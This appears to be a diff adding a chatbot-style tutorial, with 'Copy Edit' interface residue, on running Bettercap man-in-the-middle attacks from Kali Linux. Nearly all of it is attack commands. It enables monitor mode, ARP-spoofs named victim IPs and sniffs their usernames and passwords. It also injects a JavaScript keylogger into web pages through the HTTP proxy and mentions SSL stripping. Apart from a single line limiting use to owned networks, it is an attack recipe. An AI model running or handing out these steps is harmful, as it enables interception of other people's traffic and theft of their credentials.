@@ -1,0 +1,105 @@
+🛠️ 1. Install or Update Bettercap
+Bettercap is pre-installed in Kali Linux, but to ensure it’s the latest version:
+
+bash
+Copy
+Edit
+sudo apt update && sudo apt install bettercap -y
+To check version:
+
+bash
+Copy
+Edit
+bettercap --version
+🌐 2. Enable Network Adapter (for Wi-Fi attacks)
+Enable monitor mode for wireless interface (optional):
+
+bash
+Copy
+Edit
+sudo ip link set wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ip link set wlan0 up
+Or use Ethernet (eth0) for wired MITM.
+
+🚀 3. Start Bettercap with Interface
+bash
+Copy
+Edit
+sudo bettercap -iface eth0
+Replace eth0 with your actual interface (wlan0, wlan1, etc.)
+
+📡 4. Enable ARP Spoofing (MITM Attack)
+Run this in Bettercap’s interactive shell:
+
+bash
+Copy
+Edit
+net.probe on
+set arp.spoof.targets <victim_ip>
+arp.spoof on
+You can set multiple victims with commas, like 192.168.0.101,192.168.0.102.
+
+🔍 5. Sniff Network Traffic
+To sniff usernames, passwords, URLs, etc.:
+
+bash
+Copy
+Edit
+set net.sniff.verbose true
+net.sniff on
+💊 6. Inject JS/HTML Code into Web Pages
+Example: Inject a keylogger script.
+
+bash
+Copy
+Edit
+http.proxy on
+set http.proxy.script jskeylogger.js
+🧠 7. Explore Useful Modules
+To see available modules in Bettercap:
+
+bash
+Copy
+Edit
+help
+Popular modules:
+
+net.recon – Network discovery
+
+net.sniff – Packet sniffing
+
+net.probe – Active network host discovery
+
+http.proxy – HTTP manipulation
+
+wifi.recon, wifi.ap – WiFi MITM
+
+🛑 8. Stop Bettercap
+Type:
+
+bash
+Copy
+Edit
+exit
+⚠️ Important Notes:
+Run with root or sudo.
+
+Only test on networks you own or have permission to audit.
+
+Avoid attacking secured (HTTPS) traffic unless using SSL strip techniques (not always reliable).
+
+📚 Example MITM Command Chain
+bash
+Copy
+Edit
+sudo bettercap -iface eth0
+Inside Bettercap:
+
+csharp
+Copy
+Edit
+net.probe on
+set arp.spoof.targets 192.168.0.105
+arp.spoof on
+net.sniff on
